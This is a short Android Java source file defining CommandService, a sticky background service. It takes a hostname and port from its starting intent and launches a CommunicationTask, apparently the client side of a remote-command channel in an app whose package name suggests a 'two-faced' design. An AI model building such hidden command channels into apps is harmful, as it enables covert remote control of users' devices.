package com.android.app_2_faces_net;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;


public class CommandService extends Service {

    public CommandService() {
        //Empty constructor
    }

    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String socketMainHostname = intent.getExtras().getString("hostname");
        int socketMainPort = intent.getExtras().getInt("port");

        TaskRunner.getInstance().execute(new CommunicationTask(getApplicationContext(), socketMainHostname, socketMainPort));

        return START_STICKY;
    }
}
